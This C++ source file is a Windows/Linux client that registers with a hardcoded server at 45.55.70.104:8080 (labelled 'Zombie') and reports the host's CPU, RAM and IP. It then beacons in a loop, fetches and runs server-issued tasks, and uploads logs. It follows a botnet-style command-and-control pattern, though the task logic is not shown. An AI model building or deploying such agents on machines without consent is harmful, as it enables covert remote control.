#include <iostream>
#include <vector>
#include <string>

std::vector<std::string> logs;

// Define constants for server IP address and port number
const char* SERVER_IP = "45.55.70.104";
const int SERVER_PORT = 8080;
//45.55.70.104:8080/Zombie/ZombieTest
#ifdef _WIN32
// Windows-specific code
#include "win_functions.h"
#include "worker.h"
#include <WinSock2.h>
#include <thread>
#include <chrono>

void scheduledTask(Worker worker) {
    Task task;
    while (true) {
        Command command = beacon(SERVER_IP, SERVER_PORT, worker);
        switch (command) {
            case Command::REQUEST:
                processLog("\nCommand is REQUEST", &logs);
                task = request(SERVER_IP, SERVER_PORT, worker);
                std::cout << task.task << std::endl;
                break;
            case Command::CONTINUE:
                processLog("\nCommand is CONTINUE", &logs);
                break;
            case Command::STOP:
                task = Task(); // empty out the task object
                processLog("\nCommand is STOP", &logs);
                break;
            default:
                processLog("\nUnknown command", &logs);
                break;
        }
        bool finished = doTask(SERVER_IP, SERVER_PORT, task);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

int main() {
    std::string cpu = getCPUInfo();
    if (!cpu.empty()) {
        std::cout << "CPU Model Name: " << cpu << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve CPU model name." << std::endl;
    }

    std::string ramInfo = getRAMInfo();
    if (!ramInfo.empty()) {
        std::cout << "Total RAM: " << ramInfo << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve RAM information." << std::endl;
    }

    in_addr ipAddress = getIpAddress();

    Worker worker = registerWorkerWin(SERVER_IP, SERVER_PORT, ipAddress, cpu, ramInfo);

    // Check if the worker registration was successful
    if (worker.id != 0) {
        std::cout << "\n\n-----------------------------------" << std::endl;
        std::cout << "Worker registered successfully!" << std::endl;
        std::cout << "Worker ID: " << worker.id << std::endl;
        std::cout << "Worker Name: " << worker.name << std::endl;
        std::cout << "-----------------------------------\n\n" << std::endl;
    }
    else {
        std::cerr << "Failed to register worker." << std::endl;
    }

    scheduledTask(worker);

    return 0;
}
#elif defined(__linux__)
// Linux-specific code
#include "linux_functions.h"
#include "worker.h"
#include <fstream>
#include <thread>
#include <chrono>

void scheduledTask(Worker worker) {
    Task task;
    int count = 0;
    while (true) {
        Command command = beacon(SERVER_IP, SERVER_PORT, worker, task);
        switch (command) {
        case Command::REQUEST:
                processLog("\nCommand is REQUEST", &logs);
                task = request(SERVER_IP, SERVER_PORT, worker);
                std::cout << task.task << std::endl;
                break;
            case Command::CONTINUE:
                processLog("\nCommand is CONTINUE", &logs);
                break;
            case Command::STOP:
                task = Task(); // empty out the task object
                processLog("\nCommand is STOP", &logs);
                break;
            default:
                processLog("\nUnknown command", &logs);
                break;
        }
        bool finished = doTask(SERVER_IP, SERVER_PORT, task);
        count++;
        if (count % 10 == 0) {
            sendLogs(SERVER_IP, SERVER_PORT, logs, worker.id);
            logs.clear();
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

int main() {
    std::string cpu = getCPUModelName();
    if (!cpu.empty()) {
        processLog("CPU Model Name: " + cpu, &logs);
    }
    else {
        std::cerr << "Failed to retrieve CPU model name." << std::endl;
    }

    std::string ramInfo = getRAMInfo();
    if (!ramInfo.empty()) {
        processLog("Total RAM: " + ramInfo, &logs);
    }
    else {
        std::cerr << "Failed to retrieve RAM information." << std::endl;
    }

    in_addr ipAddress = getIpAddress();

    Worker worker = registerWorker(SERVER_IP, SERVER_PORT, ipAddress, cpu, ramInfo);

    // Check if the worker registration was successful
    if (worker.id != 0) {
        processLog("Worker registered successfully!", &logs);
        processLog("Worker ID: " + std::to_string(worker.id), &logs);
        processLog("Worker Name: " + worker.name, &logs);
    }
    else {
        std::cerr << "Failed to register worker." << std::endl;
    }

    scheduledTask(worker);

    return 0;
}
#endif